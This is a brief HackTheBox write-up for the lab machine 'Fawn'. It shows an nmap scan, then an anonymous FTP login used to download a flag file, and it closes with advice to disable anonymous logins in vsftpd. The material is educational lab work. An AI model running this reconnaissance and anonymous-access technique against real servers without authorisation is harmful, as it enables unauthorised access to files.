# Fawn - HackTheBox Writeup 🦌

- **Platform:** HackTheBox (Starting Point - Tier 0)
- **Target OS:** Linux
- **Vulnerability:** Anonymous FTP Access (`vsftpd`)

---

## 📌 Reconnaissance

I ran Nmap with default scripts and version detection:

```bash
nmap -sV -sC <TARGET_IP>
```

### Scan Results:
- `21/tcp open ftp vsftpd 3.0.3`
- `ftp-anon: Anonymous FTP login allowed`

Nmap identified that `anonymous` login was enabled on the FTP server.

---

## ⚡ Exploitation

I connected via the command-line FTP client using the `anonymous` user:

```bash
ftp <TARGET_IP>
```
- **Name:** `anonymous`
- **Password:** *(blank / press Enter)*

Logged in successfully.

---

## 🚩 Flag Capture

Inside the FTP prompt, I listed the files and downloaded `flag.txt`:

```ftp
ftp> ls
ftp> get flag.txt
ftp> bye
```

Back in my terminal:
```bash
cat flag.txt
```

---

## 💡 Notes & Takeaways
- Anonymous FTP access can leak sensitive files if misconfigured.
- Disable anonymous logins in `/etc/vsftpd.conf` (`anonymous_enable=NO`).
